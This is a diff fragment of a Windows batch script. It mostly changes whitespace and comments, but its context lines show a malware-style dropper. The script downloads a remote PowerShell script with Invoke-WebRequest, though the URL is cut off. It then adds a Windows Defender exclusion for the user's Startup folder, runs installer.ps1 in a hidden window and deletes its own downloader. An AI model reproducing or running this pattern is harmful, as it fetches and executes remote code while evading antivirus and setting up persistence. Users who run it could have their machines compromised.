@@ -34,15 +34,17 @@ powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http
 REM Add exclusion path for Windows Defender using PowerShell
 powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
-REM Run the downloaded installer.ps1 script using PowerShell
+    REM Run the downloaded installer.ps1 script using PowerShell
 powershell -NoProfile -WindowStyle Hidden -File "installer.ps1"
 
 
+
+@REM start
 @REM del installer.ps1
+
+
 del wget.cmd
 
-exit
+exit 
 
 
-
-REM Download the installer.ps1 script from GitHub
